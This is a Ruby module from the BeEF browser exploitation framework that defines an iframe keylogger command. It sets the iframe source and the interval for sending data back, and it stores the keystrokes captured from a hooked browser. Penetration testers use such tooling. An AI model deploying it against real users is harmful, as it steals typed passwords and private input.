#
#   Copyright 2011 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
class Iframe_keylogger < BeEF::Core::Command
  
  def self.options
    return [
        {'name' => 'iFrameSrc', 'ui_label'=>'iFrame Src', 'type' => 'textarea', 'value' =>'/demos/secret_page.html', 'width' => '400px', 'height' => '50px'},
        {'name' => 'sendBackInterval', 'ui_label' => 'Send Back Interval (ms)', 'value' => '2000', 'width'=>'100px' }
    ]
  end
  
  def post_execute
    content = {}
    content['keystrokes'] = @datastore['keystrokes']
    save content
  end
  
end